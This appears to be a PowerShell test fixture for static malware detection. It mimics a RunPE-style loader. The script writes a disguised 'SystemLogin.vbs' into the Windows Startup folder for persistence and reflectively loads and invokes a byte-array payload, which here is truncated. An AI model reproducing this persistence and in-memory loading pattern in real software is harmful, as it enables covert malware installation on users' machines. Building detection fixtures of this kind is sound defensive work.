# Static detection fixture. Never execute: byte arrays are inert.
Add-Type -AssemblyName System.Web
[Byte[]] $RUNPE = @(31,139,8,0,0,0,0,0,4,0,237,189,7,96,28,73,150,37,38,47)
Function Decompress([Byte[]] $byteArray) {
    $input = New-Object System.IO.MemoryStream(, $byteArray)
    $gzipStream = New-Object System.IO.Compression.GzipStream $input, ([IO.Compression.CompressionMode]::Decompress)
    return $gzipStream
}
Function INSTALL() {
    [String] $VBSRun = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,79,98,106,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116))
    [System.IO.File]::WriteAllText(([System.Environment]::GetFolderPath(7) + "\" + "SystemLogin.vbs"), $VBSRun)
}
INSTALL
[Type] $T = [System.Threading.Thread]::GetDomain().Load($RUNPE).GetType("A.B")
$T.GetMethod("Execute").Invoke($null, $null)
